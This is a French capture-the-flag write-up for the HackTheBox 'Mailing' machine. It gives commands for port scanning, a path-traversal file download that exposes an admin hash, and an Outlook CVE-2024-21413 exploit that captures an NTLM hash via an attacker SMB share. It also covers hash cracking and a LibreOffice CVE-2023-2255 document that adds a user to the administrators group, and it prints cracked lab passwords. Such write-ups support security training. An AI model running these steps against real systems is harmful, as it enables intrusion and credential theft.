  # Mailing

	echo "10.10.11.14 mailing.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.14 -e tun0 > ports.txt
	sudo nmap -p- -sCV -T4 10.10.11.14 -oN nmap.txt
	feroxbuster --silent -u http://mailing.htb
	
Scans classiques.

    PORT    STATE SERVICE       VERSION
    25/tcp  open  smtp          hMailServer smtpd
    80/tcp  open  http          Microsoft IIS httpd 10.0
    110/tcp open  pop3          hMailServer pop3d
    135/tcp open  msrpc         Microsoft Windows RPC
    139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
    143/tcp open  imap          hMailServer imapd
    445/tcp open  microsoft-ds?
    465/tcp open  ssl/smtp      hMailServer smtpd
    587/tcp open  smtp          hMailServer smtpd
    993/tcp open  ssl/imap      hMailServer imapd


LFI dans le téléchargement des instructions : 

    GET /download.php?file=../../../../../windows/system.ini
    

Documentations : 

https://www.hmailserver.com/documentation/v4.4/?page=folderstructure
https://www.hmailserver.com/documentation/v5.4/?page=reference_inifilesettings

Obtention du hash du mot de passe de l'administrateur puis récupération sur CrackStation : 

    GET /download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI

> AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7


Connexion sur le service hMailServer :  

    telnet 10.10.11.14 110
    USER administrator@mailing.htb
    PASS homenetworkingadministrator
    LIST
    RETR 1
    RETR 2
    RETR 3
    
On a un mail de Maya.

Utilisation du CVE 2024-21413. 

https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/blob/main/README.md

    sudo impacket-smbserver -smb2support -ip 0.0.0.0 share /tmp
    
    python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.16.62' --subject bite
    
    hashcat -m 5600 hash.txt ~/wordlists/rockyou.txt

    evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
    cd ../Desktop
    type user.txt

## Élévation de privilèges

    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName
    
> LibreOffice 7.4.0.1

Utilisation du CVE 2023-2255 en prenant avantage du fait que l'administrateur passe voir dans 'C:\Important Documents'. Faire gaffe au langage en espagnol pour le nom du groupe.

    git clone https://github.com/elweth-sec/CVE-2023-2255.git
    cd CVE-2023-2255 
    python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'privesc.odt'
    ...
    cd C:\Important Documents
    upload privesc.odt
    ...
    net user maya
    cd C:\Users\localadmin\Desktop
    type root.txt
